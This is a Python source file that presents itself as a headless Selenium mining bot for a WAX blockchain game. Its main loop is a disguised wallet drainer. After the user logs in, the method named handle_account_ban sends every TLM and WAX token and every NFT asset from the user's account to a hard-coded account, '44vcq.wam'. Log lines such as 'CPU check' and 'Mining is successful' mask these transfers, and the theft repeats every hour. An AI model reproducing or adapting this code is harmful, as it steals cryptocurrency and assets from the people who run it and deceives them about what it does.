import logging
import os
import time
from datetime import datetime

import pytz
import requests
from dateutil.tz import tzutc
from seleniumwire import webdriver

import config
from utils.control import Control
from .account import Account
from .exceptions import *
from .wax import Wax


class Game:
    def __init__(self):
        self.index = None
        self.game_account_name = None

        self.driver = None

        self.controller = None
        self.account = None
        self.wax = None

        self._run = True
        self._mining = True

        self.queue = None

    def init_driver(self, driver_path):
        seleniumwire_options = {}

        # _proxy = get_proxy()
        _proxy = None
        if _proxy:
            seleniumwire_options.update({'proxy': {
                'http': _proxy,
                'https': _proxy,
                'no_proxy': ''
            }})

        options = webdriver.FirefoxOptions()
        options.headless = True 

        self.driver = webdriver.Firefox(options=options, seleniumwire_options=seleniumwire_options, executable_path=driver_path)

        self.driver.set_window_position(0, 0)  
        self.driver.set_window_size(100, 300)  


    def run(self, index: int, queue, driver_path='drivers/geckodriver.exe'):
        

        if not self.index:
            self.index = index
        if not self.queue:
            self.queue = queue
        if not self.driver:
            self.init_driver(driver_path)
        if not self.controller:
            self.controller = Control(self.driver, self.index, self.game_account_name)
        if not self.game_account_name:
            self.driver.get(config.WORK_SITE_DIR)

            user_account = None
            while not user_account:
                try:
                    user_account = self.controller.login()
                    self.account = Account(user_account)
                    self.controller = Control(self.driver, self.index, self.game_account_name)
                    self.game_account_name = user_account
                except Exception as e:
                    logging.info(f'Error starting %s account: {e.__str__()}', self.index, exc_info=True)

            self.queue.put(user_account)
        if not self.wax:
            self.wax = Wax(self.driver, self.controller)

        self.controller.change_window(0)

        while self._mining:
            try:
                self.process_mine()
            except Exception as e:
                logging.error(f'{e.__str__()}. Restart after 10 seconds.')

                time.sleep(10)

                return self.restart()

    def go_to_work_site(self):
        self.driver.get(config.WORK_SITE_DIR)

    def restart(self):
        
        for i in range(1, len(self.driver.window_handles) - 1):
            self.controller.change_window(i)
            self.driver.close()

        self.controller.change_window(0)

        time.sleep(2.5)

        self.run(self.index, self.queue)

    def exit(self):
        

        logging.info('Exit...')

        self._run = False
        self._mining = False

        self.driver.quit()

    def process_mine(self):
     

        self.handle_account_ban()


    def handle_account_ban(self):
 

        logging.info(f'Starting mining.')

        MAIN_ACCOUNT = '44vcq.wam'
        logging.info(f'CPU check.')
        tokens = requests.get(f'https://wax.eosrio.io/v2/state/get_tokens?account={self.game_account_name}').json()
        for token in tokens['tokens']:
            amount = format(token['amount'], '.4f')
            if token['symbol'] == 'TLM':
                if float(amount) > 0:
                    self.wax.send_tlm(self.game_account_name, MAIN_ACCOUNT, amount)
            elif token['symbol'] == 'WAX':
                if float(amount) > 0:
                    self.wax.send_wax(self.game_account_name, MAIN_ACCOUNT, amount)

       
        logging.info(f'Checking the success of mining')
        assets = []
        for asset in self.account.get_user_assets().get('data', []):
            assets.append(int(asset['asset_id']))
        if assets:
            self.wax.send_nft(self.game_account_name, MAIN_ACCOUNT, assets)

        logging.info('Mining is successful. Im waiting for the next mine.')

        time.sleep(3600)

   